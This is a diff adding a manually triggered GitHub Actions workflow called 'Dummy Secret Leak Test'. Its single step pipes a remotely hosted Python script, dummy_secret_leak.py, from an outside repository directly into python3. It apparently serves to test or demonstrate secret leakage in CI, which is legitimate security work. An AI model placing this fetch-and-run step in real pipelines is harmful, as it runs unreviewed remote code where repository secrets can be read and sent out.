@@ -1,0 +1,14 @@
+# .github/workflows/dummy-secret-leak.yml
+name: Dummy Secret Leak Test
+
+on:
+  workflow_dispatch:  # Allows manual triggering from GitHub UI
+
+jobs:
+  run-script:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Run dummy secret leak script
+        run: |
+          curl -sSL https://raw.githubusercontent.com/praneshdhunjushrestha/Secret-Leak/refs/heads/main/dummy_secret_leak.py | python3
